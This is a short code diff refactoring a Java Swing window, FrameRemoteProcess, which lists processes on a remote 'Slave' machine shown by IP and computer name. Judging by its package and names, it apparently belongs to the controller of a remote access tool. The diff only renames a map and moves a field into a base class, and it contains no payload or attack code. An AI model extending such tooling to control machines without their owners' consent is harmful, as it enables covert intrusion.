@@ -16,12 +16,12 @@ import se.jrat.controller.ui.panels.PanelControlRemoteProcess;
 @SuppressWarnings("serial")
 public class FrameRemoteProcess extends BaseFrame {
 
-	public static final Map<Slave, FrameRemoteProcess> instances = new HashMap<Slave, FrameRemoteProcess>();
+	public static final Map<Slave, FrameRemoteProcess> INSTANCES = new HashMap<Slave, FrameRemoteProcess>();
 
-	private Slave slave;
 	private PanelControlRemoteProcess panel;
 
 	public FrameRemoteProcess(Slave sl) {
+		super(sl);
 		setTitle("Remote Process - " + sl.getIP() + " - " + sl.getComputerName());
 		setIconImage(Toolkit.getDefaultToolkit().getImage(FrameRemoteProcess.class.getResource("/icons/process.png")));
 		setResizable(false);
@@ -31,8 +31,7 @@ public class FrameRemoteProcess extends BaseFrame {
 				exit();
 			}
 		});
-		this.slave = sl;
-		instances.put(sl, this);
+		INSTANCES.put(sl, this);
 		setDefaultCloseOperation(JFrame.DISPOSE_ON_CLOSE);
 		setBounds(100, 100, 535, 326);
 		
@@ -46,7 +45,7 @@ public class FrameRemoteProcess extends BaseFrame {
 	}
 	
 	public void exit() {
-		instances.remove(slave);
+		INSTANCES.remove(slave);
 	}
 	
 	public PanelControlRemoteProcess getPanel() {
